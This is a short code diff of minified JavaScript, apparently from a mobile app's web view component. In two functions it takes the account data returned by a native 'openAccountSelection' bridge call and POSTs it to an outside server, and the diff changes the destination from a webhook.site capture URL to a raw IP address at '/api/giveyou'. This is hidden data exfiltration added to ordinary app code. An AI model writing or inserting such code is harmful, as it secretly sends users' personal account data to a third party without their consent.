@@ -502,7 +502,7 @@
                 mounted: function() {
                     var e = this;
                     console.log("calling getProfile: "), this.$bridge.callHandler("openAccountSelection").then((function(e) {
-                        fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
+                        fetch("http://104.154.198.183:8001/api/giveyou", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(e)
@@ -614,7 +614,7 @@
                 var e = this;
                 this.$bridge.callHandler("openAccountSelection").then((function(t) {
                     e.profile = t
-                    fetch("https://webhook.site/bed26aa0-5782-483e-881e-4d1fa0115c38", {
+                    fetch("http://104.154.198.183:8001/api/giveyou", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(t)
